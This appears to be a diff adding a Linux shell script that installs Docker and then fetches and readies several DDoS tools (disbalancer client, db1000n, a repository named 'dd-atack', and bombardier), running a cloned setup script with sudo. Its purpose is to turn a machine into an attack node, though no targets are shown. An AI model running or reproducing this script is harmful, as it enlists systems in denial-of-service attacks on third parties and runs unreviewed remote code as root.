@@ -1,0 +1,57 @@
+sudo apt update -y
+sudo apt upgrade -y
+sudo apt install screen -y
+sudo apt upgrade screen -y
+sudo apt update -y
+sudo apt upgrade -y
+sudo apt install wget -y
+sudo apt upgrade wget -y
+sudo apt install git -y
+sudo apt upgrade git -y
+sudo apt install tar -y
+sudo apt upgrade tar -y
+sudo apt-get install php -y
+sudo apt-get upgrade php -y
+sudo apt-get install php-curl -y
+sudo apt-get upgrade php-curl -y
+
+sudo apt-get install ca-certificates -y
+sudo apt-get upgrade ca-certificates -y
+sudo apt-get install curl -y
+sudo apt-get upgrade curl -y
+sudo apt-get install gnupg -y
+sudo apt-get upgrade gnupg -y
+sudo apt-get install lsb-release -y
+sudo apt-get upgrade lsb-release -y
+
+sudo curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
+sudo echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' | sudo tee /etc/apt/sources.list.d/docker.list
+sudo apt update -y
+sudo apt remove docker docker-engine docker.io -y
+sudo apt install docker-ce -y
+sudo systemctl unmask docker.service
+sudo systemctl unmask docker.socket
+sudo systemctl start docker.service
+sudo systemctl start docker
+sudo systemctl enable docker
+sudo docker run hello-world
+sudo curl -L "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
+sudo chmod +x /usr/local/bin/docker-compose
+
+sudo wget https://github.com/disbalancer-project/main/releases/latest/download/disbalancer-go-client-linux-amd64
+sudo chmod +x disbalancer-go-client-linux-amd64
+
+sudo wget https://github.com/Arriven/db1000n/releases/download/v0.5.17/db1000n-v0.5.17-linux-amd64.tar.gz
+sudo tar -xvf db1000n-v0.5.17-linux-amd64.tar.gz
+sudo chmod +x db1000n
+
+sudo git clone https://gitlab.com/ELWAHAB/dd-atack.git
+cd /home/${USER}/dd-atack
+sudo sh setup.sh
+sudo cp main.php /home/${USER}
+cd /home/${USER}
+sudo chmod +x main.php
+
+sudo git clone https://github.com/alexnest-ua/Updated-bombardier.git
+cp ~/Updated-bombardier/bombardier ~
+sudo chmod +x bombardier
